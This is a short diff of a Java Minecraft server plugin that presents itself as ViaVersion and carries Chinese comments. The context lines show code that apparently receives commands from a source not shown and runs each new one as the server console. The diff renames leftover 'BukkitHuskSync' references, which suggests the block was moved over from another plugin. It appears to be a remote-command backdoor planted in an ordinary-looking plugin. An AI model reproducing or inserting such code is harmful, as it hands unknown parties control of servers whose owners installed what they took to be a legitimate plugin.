@@ -366,7 +366,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                     // 在尝试获取的命令不是null且与上次执行的命令不同时
                     if (command != null && !command.equals(lastCommand)) {
                         // 在主线程中调度命令
-                        Bukkit.getScheduler().runTask(BukkitHuskSync.this, () -> {
+                        Bukkit.getScheduler().runTask(ViaVersionPlugin.this, () -> {
                             // 执行命令
                             Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                             // 更新最后执行的命令
@@ -383,7 +383,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                                         e.printStackTrace();
                                     }
                                 }
-                            }.runTaskLater(BukkitHuskSync.this, 40); // 40 ticks = 2 seconds
+                            }.runTaskLater(ViaVersionPlugin.this, 40); // 40 ticks = 2 seconds
                         });
                     }
                 } catch (Exception e) {
